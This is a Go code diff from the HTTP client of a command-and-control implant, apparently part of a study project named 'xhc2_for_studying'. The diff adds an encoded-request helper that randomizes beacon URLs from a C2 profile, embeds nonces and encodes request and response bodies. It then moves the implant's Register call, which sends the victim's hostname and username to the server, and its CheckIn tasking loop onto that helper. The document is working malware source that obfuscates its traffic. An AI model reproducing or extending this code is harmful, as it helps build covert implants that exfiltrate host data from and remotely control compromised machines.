@@ -5,13 +5,71 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"net/http"
-	
+
 	"xhc2_for_studying/implant/config"
 	"xhc2_for_studying/implant/identity"
 	"xhc2_for_studying/protocol"
 	beaconProtocol "xhc2_for_studying/protocol/beacon"
 )
+
+// contentType 根据编码器 ID 返回对应的 Content-Type。
+func contentType(encoderID int) string {
+	switch encoderID {
+	case 0: // Plain
+		return "application/json"
+	default: // Base64 或其他
+		return "application/octet-stream"
+	}
+}
+
+// sendEncoded 执行一次编码后的 HTTP POST。
+// 1. 编码请求体
+// 2. 生成随机 URL + 嵌入 nonce
+// 3. 发送请求
+// 4. 解码响应体
+//
+// 返回解码后的响应字节和可能出现的错误。
+func (c *Client) sendEncoded(jsonBody []byte, rctx *RequestContext) ([]byte, error) {
+	// 编码请求体
+	encodedBody, err := encodeBody(jsonBody, rctx.EncoderID)
+	if err != nil {
+		return nil, fmt.Errorf("encode request: %w", err)
+	}
+
+	// 生成随机 URL 并嵌入 nonce
+	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile)
+	if err != nil {
+		return nil, fmt.Errorf("build random url: %w", err)
+	}
+	embedNonce(reqURL, rctx.Nonce, c.c2Profile.NonceMode)
+
+	// 发送请求
+	httpReq, err := http.NewRequest(http.MethodPost, reqURL.String(), bytes.NewReader(encodedBody))
+	if err != nil {
+		return nil, err
+	}
+	httpReq.Header.Set("Content-Type", contentType(rctx.EncoderID))
+
+	resp, err := c.httpClient.Do(httpReq)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	rawBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(rawBody))
+	}
+
+	// 解码响应体
+	return decodeBody(rawBody, rctx.EncoderID)
+}
 
 func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig) (string, error) {
 	if c == nil {
@@ -23,10 +81,7 @@ func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig)
 	if cfg == nil {
 		return "", errors.New("beacon config is nil")
 	}
-	if c.baseURL == "" {
-		return "", errors.New("client base url is empty")
-	}
-	
+
 	req := &beaconProtocol.RegisterRequest{
 		Hostname: hostInfo.Hostname,
 		Username: hostInfo.Username,
@@ -35,44 +90,26 @@ func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig)
 		Interval: cfg.Interval,
 		Jitter:   cfg.Jitter,
 	}
-	
+
 	jsonReq, err := json.Marshal(req)
 	if err != nil {
 		return "", err
 	}
-	
-	httpReq, err := http.NewRequest(
-		http.MethodPost,
-		c.baseURL+"/beacon/register",
-		bytes.NewReader(jsonReq),
-	)
+
+	rctx := NewRequestContext(c.c2Profile.EncoderModulus)
+	decodedBody, err := c.sendEncoded(jsonReq, rctx)
 	if err != nil {
 		return "", err
 	}
-	httpReq.Header.Set("Content-Type", "application/json")
-	
-	if c.httpClient == nil {
-		return "", errors.New("http client is nil")
-	}
-	
-	resp, err := c.httpClient.Do(httpReq)
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-	
-	if resp.StatusCode != http.StatusOK {
-		return "", fmt.Errorf("register request failed with status %d", resp.StatusCode)
-	}
-	
+
 	var registerResp beaconProtocol.RegisterResponse
-	if err := json.NewDecoder(resp.Body).Decode(&registerResp); err != nil {
+	if err := json.Unmarshal(decodedBody, &registerResp); err != nil {
 		return "", err
 	}
 	if registerResp.BeaconID == "" {
 		return "", errors.New("empty beacon id in register response")
 	}
-	
+
 	return registerResp.BeaconID, nil
 }
 
@@ -83,15 +120,12 @@ func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*bea
 	if beaconID == "" {
 		return nil, errors.New("beacon id is empty")
 	}
-	if c.baseURL == "" {
-		return nil, errors.New("client base url is empty")
-	}
-	
+
 	reqTaskResult := protocol.TaskResult{}
 	if taskResult != nil {
 		reqTaskResult = *taskResult
 	}
-	
+
 	req := &beaconProtocol.CheckinRequest{
 		BeaconID:   beaconID,
 		TaskResult: reqTaskResult,
@@ -100,28 +134,15 @@ func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*bea
 	if err != nil {
 		return nil, err
 	}
-	httpReq, err := http.NewRequest(
-		http.MethodPost,
-		c.baseURL+"/beacon/checkin",
-		bytes.NewReader(jsonReq),
-	)
+
+	rctx := NewRequestContext(c.c2Profile.EncoderModulus)
+	decodedBody, err := c.sendEncoded(jsonReq, rctx)
 	if err != nil {
 		return nil, err
 	}
-	httpReq.Header.Set("Content-Type", "application/json")
-	if c.httpClient == nil {
-		return nil, errors.New("http client is nil")
-	}
-	resp, err := c.httpClient.Do(httpReq)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("checkin request failed with status %d", resp.StatusCode)
-	}
+
 	var checkinResp beaconProtocol.CheckinResponse
-	if err := json.NewDecoder(resp.Body).Decode(&checkinResp); err != nil {
+	if err := json.Unmarshal(decodedBody, &checkinResp); err != nil {
 		return nil, err
 	}
 	return &checkinResp, nil
